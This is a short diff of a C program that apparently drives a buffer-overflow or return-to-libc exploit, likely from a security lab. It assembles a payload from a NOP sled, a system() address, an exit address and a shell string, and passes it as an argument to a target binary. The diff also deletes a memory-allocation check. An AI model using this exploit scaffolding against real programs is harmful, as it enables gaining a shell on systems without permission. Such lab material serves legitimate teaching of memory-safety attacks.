@@ -18,13 +18,8 @@ int main(void)
     char *env[1];
     args[0] = (char*)TARGET;
 
-    // Allocate memory to hold the combined string
     args[1] = malloc(strlen(SLED) + strlen(SYS) + strlen(EX) + strlen(SH) + 1);
-    if (args[1] == NULL) {
-        fprintf(stderr, "Memory allocation failed.\n");
-        return -1;
-    }
-    // Concatenate the strings safely into args[1]
+   
     strcpy(args[1], SLED);
     strcat(args[1], SYS);
     strcat(args[1], EX);
